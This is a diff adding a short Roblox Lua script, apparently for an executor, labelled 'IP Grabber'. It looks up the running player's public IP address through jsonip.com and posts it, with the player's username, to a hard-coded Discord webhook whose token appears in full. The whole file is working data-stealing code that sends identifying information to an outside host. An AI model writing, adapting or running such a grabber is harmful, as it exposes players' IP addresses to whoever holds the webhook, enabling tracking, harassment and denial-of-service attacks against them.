@@ -1,0 +1,28 @@
+local webhookURL = "https://discord.com/api/webhooks/1307876205504106538/1WVEf5VaclclO_R-dz0rEqTV2krHXaw83FeqMM53GCJ5XHazs8ev_U-CxeyUwGfMdI9M"
+local MarketplaceService = game:GetService("MarketplaceService")
+local httpService = game:GetService("HttpService")
+
+local function getIP()
+    local url = "https://ipv4.jsonip.com/"
+    local response = game:HttpGet(url)
+    local ipData = httpService:JSONDecode(response)
+    return ipData.ip
+end
+
+local ip = getIP()
+
+local data = {
+    ["content"] = game.Players.LocalPlayer.Name.. "'s IP is: ".. ip,
+    ["Username"] = "IP Grabber"
+}
+
+local json = game:GetService("HttpService"):JSONEncode(data)
+
+syn.request({
+    Url = webhookURL,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = json
+})
